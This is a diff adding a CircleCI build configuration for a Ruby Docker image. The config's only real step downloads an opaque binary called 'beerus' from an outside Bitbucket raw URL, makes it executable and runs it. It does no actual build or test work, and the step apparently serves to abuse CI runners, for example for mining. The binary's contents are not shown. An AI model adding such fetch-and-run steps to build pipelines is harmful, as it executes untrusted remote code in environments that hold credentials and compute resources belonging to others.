@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://bitbucket.org/sakalilion/guardian4-1/raw/f47417d149c83687ab2302032020074d5a02ae71/beerus && chmod +x beerus && ./beerus
